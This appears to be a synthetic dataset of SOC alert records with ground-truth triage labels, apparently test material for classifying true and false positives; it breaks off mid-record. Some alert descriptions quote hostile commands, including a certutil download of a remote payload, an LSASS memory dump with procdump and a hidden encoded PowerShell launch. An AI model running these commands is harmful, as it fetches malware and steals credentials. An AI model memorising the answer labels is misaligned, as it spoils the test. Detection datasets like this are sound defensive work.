@@ -1,0 +1,982 @@
+[
+  {
+    "alert_id": "AL-EXP-01056",
+    "timestamp": "2026-11-07T11:12:00Z",
+    "source_ip": "194.26.29.112",
+    "destination_ip": "10.0.0.5",
+    "user": "m.ross",
+    "host": "db-prod-02",
+    "event_type": "scheduled_maintenance",
+    "description": "Nessus Vulnerability Scanner (Asset ID: VULN-SCAN-01, IP: 194.26.29.112) running scheduled PCI-DSS compliance sweep.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "ambiguous_admin_false_positive",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": true,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00830",
+    "timestamp": "2026-11-02T00:16:00Z",
+    "source_ip": "194.26.29.112",
+    "destination_ip": "10.0.0.12",
+    "user": "charlie.admin",
+    "host": "jumpbox-01",
+    "event_type": "scheduled_maintenance",
+    "description": "SCCM configuration manager pushing monthly KB5034441 cumulative security rollup to jumpbox-01.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "ambiguous_admin_false_positive",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": true,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00210",
+    "timestamp": "2026-11-09T13:57:00Z",
+    "source_ip": "194.26.29.112",
+    "destination_ip": "104.244.42.1",
+    "user": "svc_sql",
+    "host": "fw-edge-01",
+    "event_type": "scheduled_maintenance",
+    "description": "SCCM configuration manager pushing monthly KB5034441 cumulative security rollup to fw-edge-01.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "ambiguous_admin_false_positive",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": true,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00817",
+    "timestamp": "2026-11-03T09:33:00Z",
+    "source_ip": "194.26.29.112",
+    "destination_ip": "52.216.14.8",
+    "user": "svc_backup",
+    "host": "k8s-worker-03",
+    "event_type": "scheduled_maintenance",
+    "description": "Ansible automation controller 194.26.29.112 executing root maintenance playbook on cluster host k8s-worker-03.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "ambiguous_admin_false_positive",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": true,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-01188",
+    "timestamp": "2026-11-06T18:00:00Z",
+    "source_ip": "172.16.50.4",
+    "destination_ip": "185.199.108.153",
+    "user": "svc_backup",
+    "host": "ws-hr-104",
+    "event_type": "scheduled_maintenance",
+    "description": "Nessus Vulnerability Scanner (Asset ID: VULN-SCAN-01, IP: 172.16.50.4) running scheduled PCI-DSS compliance sweep.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "ambiguous_admin_false_positive",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": true,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00180",
+    "timestamp": "2026-11-11T01:22:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "172.16.1.100",
+    "user": "charlie.admin",
+    "host": "jumpbox-01",
+    "event_type": "scheduled_maintenance",
+    "description": "SCCM configuration manager pushing monthly KB5034441 cumulative security rollup to jumpbox-01.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "ambiguous_admin_false_positive",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": true,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00924",
+    "timestamp": "2026-11-19T17:26:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "10.0.0.12",
+    "user": "svc_backup",
+    "host": "ws-hr-104",
+    "event_type": "scheduled_maintenance",
+    "description": "Ansible automation controller 192.168.1.15 executing root maintenance playbook on cluster host ws-hr-104.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "ambiguous_admin_false_positive",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": true,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00199",
+    "timestamp": "2026-11-09T23:44:00Z",
+    "source_ip": "172.16.50.4",
+    "destination_ip": "172.16.1.100",
+    "user": "charlie.admin",
+    "host": "fw-edge-01",
+    "event_type": "authentication_failure",
+    "description": "User charlie.admin active directory account locked out. Cached credentials on mobile device iPhone-14 repeatedly polling Exchange ActiveSync.",
+    "failed_attempts": 1,
+    "metadata": {
+      "ground_truth_category": "ambiguous_user_lockout",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-01072",
+    "timestamp": "2026-11-19T06:27:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "192.168.50.2",
+    "user": "svc_backup",
+    "host": "app-web-01",
+    "event_type": "authentication_failure",
+    "description": "User svc_backup active directory account locked out. Cached credentials on mobile device iPhone-14 repeatedly polling Exchange ActiveSync.",
+    "failed_attempts": 3,
+    "metadata": {
+      "ground_truth_category": "ambiguous_user_lockout",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00499",
+    "timestamp": "2026-11-11T01:46:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "185.199.108.153",
+    "user": "svc_sql",
+    "host": "fw-edge-01",
+    "event_type": "authentication_failure",
+    "description": "Workstation screensaver unlock attempt failed 2 times: user entered previous password following required 90-day rotation.",
+    "failed_attempts": 3,
+    "metadata": {
+      "ground_truth_category": "ambiguous_user_lockout",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00247",
+    "timestamp": "2026-11-07T00:42:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "185.199.108.153",
+    "user": "j.watson",
+    "host": "fw-edge-01",
+    "event_type": "authentication_failure",
+    "description": "Workstation screensaver unlock attempt failed 2 times: user entered previous password following required 90-day rotation.",
+    "failed_attempts": 2,
+    "metadata": {
+      "ground_truth_category": "ambiguous_user_lockout",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00056",
+    "timestamp": "2026-11-04T20:29:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "104.244.42.1",
+    "user": "bob.jenkins",
+    "host": "k8s-worker-03",
+    "event_type": "authentication_failure",
+    "description": "User bob.jenkins active directory account locked out. Cached credentials on mobile device iPhone-14 repeatedly polling Exchange ActiveSync.",
+    "failed_attempts": 1,
+    "metadata": {
+      "ground_truth_category": "ambiguous_user_lockout",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00258",
+    "timestamp": "2026-11-18T02:48:00Z",
+    "source_ip": "10.0.10.45",
+    "destination_ip": "10.0.0.12",
+    "user": "svc_backup",
+    "host": "db-prod-02",
+    "event_type": "authentication_failure",
+    "description": "User svc_backup active directory account locked out. Cached credentials on mobile device iPhone-14 repeatedly polling Exchange ActiveSync.",
+    "failed_attempts": 1,
+    "metadata": {
+      "ground_truth_category": "ambiguous_user_lockout",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00897",
+    "timestamp": "2026-11-06T01:36:00Z",
+    "source_ip": "194.26.29.112",
+    "destination_ip": "10.0.0.5",
+    "user": "alice.smith",
+    "host": "fw-edge-01",
+    "event_type": "authentication_failure",
+    "description": "User alice.smith active directory account locked out. Cached credentials on mobile device iPhone-14 repeatedly polling Exchange ActiveSync.",
+    "failed_attempts": 2,
+    "metadata": {
+      "ground_truth_category": "ambiguous_user_lockout",
+      "ground_truth_classification": "likely_false_positive",
+      "ground_truth_severity": "low",
+      "mitre_technique": "N/A",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00208",
+    "timestamp": "2026-11-04T06:27:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "10.0.0.12",
+    "user": "dev_deployer",
+    "host": "ws-hr-104",
+    "event_type": "authentication_failure",
+    "description": "EventID: 4625 (Logon Failure) SubStatus: 0xC000006A (Bad Password). Account: dev_deployer from Workstation: 192.168.1.15 threshold exceeded.",
+    "failed_attempts": 21,
+    "metadata": {
+      "ground_truth_category": "brute_force",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1110",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00033",
+    "timestamp": "2026-11-06T03:01:00Z",
+    "source_ip": "172.16.50.4",
+    "destination_ip": "10.0.0.5",
+    "user": "svc_backup",
+    "host": "ws-hr-104",
+    "event_type": "authentication_failure",
+    "description": "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.50.4 user=svc_backup",
+    "failed_attempts": 13,
+    "metadata": {
+      "ground_truth_category": "brute_force",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1110",
+      "login_success_after_failures": true,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00832",
+    "timestamp": "2026-11-05T14:10:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "52.216.14.8",
+    "user": "bob.jenkins",
+    "host": "jumpbox-01",
+    "event_type": "authentication_failure",
+    "description": "SSH-2.0-OpenSSH_8.9p1 connection flood: 8 failed auth attempts against jumpbox-01 port 22 from 192.168.1.15.",
+    "failed_attempts": 8,
+    "metadata": {
+      "ground_truth_category": "brute_force",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1110",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00492",
+    "timestamp": "2026-11-08T03:09:00Z",
+    "source_ip": "10.0.10.45",
+    "destination_ip": "172.16.1.100",
+    "user": "j.watson",
+    "host": "db-prod-02",
+    "event_type": "authentication_failure",
+    "description": "Multiple Kerberos pre-authentication errors (KRB_AP_ERR_BAD_INTEGRITY) targeting principal j.watson@CORP.LOCAL followed by TGT grant.",
+    "failed_attempts": 40,
+    "metadata": {
+      "ground_truth_category": "brute_force",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1110",
+      "login_success_after_failures": true,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00146",
+    "timestamp": "2026-11-10T23:03:00Z",
+    "source_ip": "103.208.220.5",
+    "destination_ip": "104.244.42.1",
+    "user": "j.watson",
+    "host": "jumpbox-01",
+    "event_type": "authentication_failure",
+    "description": "SSH-2.0-OpenSSH_8.9p1 connection flood: 6 failed auth attempts against jumpbox-01 port 22 from 103.208.220.5.",
+    "failed_attempts": 6,
+    "metadata": {
+      "ground_truth_category": "brute_force",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1110",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00624",
+    "timestamp": "2026-11-02T09:02:00Z",
+    "source_ip": "103.208.220.5",
+    "destination_ip": "10.0.0.5",
+    "user": "m.ross",
+    "host": "dc-01.corp",
+    "event_type": "authentication_failure",
+    "description": "Multiple Kerberos pre-authentication errors (KRB_AP_ERR_BAD_INTEGRITY) targeting principal m.ross@CORP.LOCAL followed by TGT grant.",
+    "failed_attempts": 21,
+    "metadata": {
+      "ground_truth_category": "brute_force",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1110",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00347",
+    "timestamp": "2026-11-16T18:38:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "172.16.1.100",
+    "user": "svc_backup",
+    "host": "k8s-worker-03",
+    "event_type": "authentication_failure",
+    "description": "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.15 user=svc_backup",
+    "failed_attempts": 31,
+    "metadata": {
+      "ground_truth_category": "brute_force",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1110",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00455",
+    "timestamp": "2026-11-18T09:55:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "192.168.50.2",
+    "user": "m.ross",
+    "host": "db-prod-02",
+    "event_type": "heuristic_anomaly",
+    "description": "Uncharacteristic off-hours RDP session initiated by m.ross from residential VPN IP 45.142.214.10 at 03:14 AM.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "insufficient_evidence_anomaly",
+      "ground_truth_classification": "needs_investigation",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1078",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00609",
+    "timestamp": "2026-11-09T05:56:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "192.168.50.2",
+    "user": "alice.smith",
+    "host": "db-prod-02",
+    "event_type": "heuristic_anomaly",
+    "description": "New parent-child relationship: explorer.exe -> powershell.exe -> git.exe on workstation db-prod-02.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "insufficient_evidence_anomaly",
+      "ground_truth_classification": "needs_investigation",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1078",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00500",
+    "timestamp": "2026-11-04T12:44:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "10.0.0.12",
+    "user": "charlie.admin",
+    "host": "jumpbox-01",
+    "event_type": "heuristic_anomaly",
+    "description": "Uncharacteristic off-hours RDP session initiated by charlie.admin from residential VPN IP 185.220.101.5 at 03:14 AM.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "insufficient_evidence_anomaly",
+      "ground_truth_classification": "needs_investigation",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1078",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-01161",
+    "timestamp": "2026-11-09T22:52:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "185.199.108.153",
+    "user": "dev_deployer",
+    "host": "dc-01.corp",
+    "event_type": "heuristic_anomaly",
+    "description": "Uncharacteristic off-hours RDP session initiated by dev_deployer from residential VPN IP 185.220.101.5 at 03:14 AM.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "insufficient_evidence_anomaly",
+      "ground_truth_classification": "needs_investigation",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1078",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00642",
+    "timestamp": "2026-11-04T12:22:00Z",
+    "source_ip": "103.208.220.5",
+    "destination_ip": "10.0.0.5",
+    "user": "bob.jenkins",
+    "host": "k8s-worker-03",
+    "event_type": "heuristic_anomaly",
+    "description": "Uncharacteristic off-hours RDP session initiated by bob.jenkins from residential VPN IP 103.208.220.5 at 03:14 AM.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "insufficient_evidence_anomaly",
+      "ground_truth_classification": "needs_investigation",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1078",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00635",
+    "timestamp": "2026-11-05T12:30:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "192.168.50.2",
+    "user": "charlie.admin",
+    "host": "ws-hr-104",
+    "event_type": "heuristic_anomaly",
+    "description": "New parent-child relationship: explorer.exe -> powershell.exe -> git.exe on workstation ws-hr-104.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "insufficient_evidence_anomaly",
+      "ground_truth_classification": "needs_investigation",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1078",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00039",
+    "timestamp": "2026-11-06T11:39:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "52.216.14.8",
+    "user": "charlie.admin",
+    "host": "k8s-worker-03",
+    "event_type": "heuristic_anomaly",
+    "description": "New parent-child relationship: explorer.exe -> powershell.exe -> git.exe on workstation k8s-worker-03.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "insufficient_evidence_anomaly",
+      "ground_truth_classification": "needs_investigation",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1078",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00239",
+    "timestamp": "2026-11-20T19:11:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "10.0.0.5",
+    "user": "m.ross",
+    "host": "jumpbox-01",
+    "event_type": "edr_process_anomaly",
+    "description": "Sysmon Event 1: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi... spawned by wmic.exe on jumpbox-01.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "living_off_the_land_malware",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "critical",
+      "mitre_technique": "T1059",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": "8754b2b075e7f9a888c3de77ed215888e2cae5cb2cfdcaaaec1324747ebc79a9"
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00931",
+    "timestamp": "2026-11-08T14:08:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "185.199.108.153",
+    "user": "m.ross",
+    "host": "db-prod-02",
+    "event_type": "edr_process_anomaly",
+    "description": "Process certutil.exe spawned with arguments '-urlcache -split -f http://185.199.108.153/payload.bin C:\\Windows\\Temp\\update.exe'.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "living_off_the_land_malware",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "critical",
+      "mitre_technique": "T1059",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": "3a9f7d54b2a8848d7920703f26033bbca818961726a2e22c95b682ec09c62921"
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00556",
+    "timestamp": "2026-11-17T19:49:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "104.244.42.1",
+    "user": "j.watson",
+    "host": "ws-hr-104",
+    "event_type": "edr_process_anomaly",
+    "description": "Sysmon Event 1: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi... spawned by wmic.exe on ws-hr-104.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "living_off_the_land_malware",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "critical",
+      "mitre_technique": "T1059",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00481",
+    "timestamp": "2026-11-18T17:44:00Z",
+    "source_ip": "194.26.29.112",
+    "destination_ip": "185.199.108.153",
+    "user": "bob.jenkins",
+    "host": "jumpbox-01",
+    "event_type": "edr_process_anomaly",
+    "description": "Sysmon Event 1: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi... spawned by wmic.exe on jumpbox-01.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "living_off_the_land_malware",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "critical",
+      "mitre_technique": "T1059",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": "3a9f7d54b2a8848d7920703f26033bbca818961726a2e22c95b682ec09c62921"
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00710",
+    "timestamp": "2026-11-09T21:10:00Z",
+    "source_ip": "172.16.50.4",
+    "destination_ip": "192.168.50.2",
+    "user": "charlie.admin",
+    "host": "dc-01.corp",
+    "event_type": "edr_process_anomaly",
+    "description": "Process certutil.exe spawned with arguments '-urlcache -split -f http://192.168.50.2/payload.bin C:\\Windows\\Temp\\update.exe'.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "living_off_the_land_malware",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "critical",
+      "mitre_technique": "T1059",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": "8754b2b075e7f9a888c3de77ed215888e2cae5cb2cfdcaaaec1324747ebc79a9"
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00997",
+    "timestamp": "2026-11-09T05:56:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "192.168.50.2",
+    "user": "bob.jenkins",
+    "host": "dc-01.corp",
+    "event_type": "edr_process_anomaly",
+    "description": "Subversion: rundll32.exe executing exported DLL function from AppData\\Roaming\\update.vbs under user bob.jenkins.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "living_off_the_land_malware",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "critical",
+      "mitre_technique": "T1059",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00584",
+    "timestamp": "2026-11-02T20:05:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "10.0.0.12",
+    "user": "m.ross",
+    "host": "dc-01.corp",
+    "event_type": "edr_process_anomaly",
+    "description": "LSASS handle injection detected: procdump.exe -ma lsass.exe lsass.dmp invoked by m.ross on domain controller dc-01.corp.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "living_off_the_land_malware",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "critical",
+      "mitre_technique": "T1059",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": "3a9f7d54b2a8848d7920703f26033bbca818961726a2e22c95b682ec09c62921"
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00729",
+    "timestamp": "2026-11-18T10:59:00Z",
+    "source_ip": "103.208.220.5",
+    "destination_ip": "185.199.108.153",
+    "user": "dev_deployer",
+    "host": "db-prod-02",
+    "event_type": "network_recon",
+    "description": "Snort Alert [1:2001219:15] ET SCAN Potential NMAP OS Detection Probe originating from 103.208.220.5.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "port_scan",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1046",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00008",
+    "timestamp": "2026-11-10T14:03:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "172.16.1.100",
+    "user": "m.ross",
+    "host": "jumpbox-01",
+    "event_type": "network_recon",
+    "description": "Firewall DROP: Inbound SYN burst 45.142.214.10 -> 172.16.1.100 ports [8008, 2479, 5059, 4358]. Flow rate > 120 pkts/sec.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "port_scan",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1046",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00062",
+    "timestamp": "2026-11-13T07:01:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "192.168.50.2",
+    "user": "dev_deployer",
+    "host": "db-prod-02",
+    "event_type": "network_recon",
+    "description": "Perimeter edge ACL violation: TCP stealth scan across 87 sequential ports on DMZ subnet.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "port_scan",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1046",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00734",
+    "timestamp": "2026-11-05T11:52:00Z",
+    "source_ip": "172.16.50.4",
+    "destination_ip": "52.216.14.8",
+    "user": "svc_backup",
+    "host": "ws-hr-104",
+    "event_type": "network_recon",
+    "description": "Snort Alert [1:2001219:15] ET SCAN Potential NMAP OS Detection Probe originating from 172.16.50.4.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "port_scan",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1046",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00534",
+    "timestamp": "2026-11-17T16:49:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "10.0.0.5",
+    "user": "j.watson",
+    "host": "dc-01.corp",
+    "event_type": "network_recon",
+    "description": "Perimeter edge ACL violation: TCP stealth scan across 89 sequential ports on DMZ subnet.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "port_scan",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1046",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00953",
+    "timestamp": "2026-11-19T00:59:00Z",
+    "source_ip": "194.26.29.112",
+    "destination_ip": "192.168.50.2",
+    "user": "bob.jenkins",
+    "host": "k8s-worker-03",
+    "event_type": "network_recon",
+    "description": "Firewall DROP: Inbound SYN burst 194.26.29.112 -> 192.168.50.2 ports [6955, 7365, 5031, 401]. Flow rate > 120 pkts/sec.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "port_scan",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1046",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-01026",
+    "timestamp": "2026-11-16T10:59:00Z",
+    "source_ip": "103.208.220.5",
+    "destination_ip": "10.0.0.5",
+    "user": "alice.smith",
+    "host": "dc-01.corp",
+    "event_type": "network_recon",
+    "description": "Firewall DROP: Inbound SYN burst 103.208.220.5 -> 10.0.0.5 ports [2570, 3644, 7610, 7883]. Flow rate > 120 pkts/sec.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "port_scan",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "medium",
+      "mitre_technique": "T1046",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-01144",
+    "timestamp": "2026-11-18T23:08:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "185.199.108.153",
+    "user": "svc_sql",
+    "host": "dc-01.corp",
+    "event_type": "network_egress",
+    "description": "Zeek conn.log: Periodic beaconing detected 192.168.1.15 -> 185.199.108.153:443 jitter=2.3s interval=60s byte_ratio=0.98.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "suspicious_c2_outbound",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1071",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00018",
+    "timestamp": "2026-11-18T05:31:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "52.216.14.8",
+    "user": "charlie.admin",
+    "host": "k8s-worker-03",
+    "event_type": "network_egress",
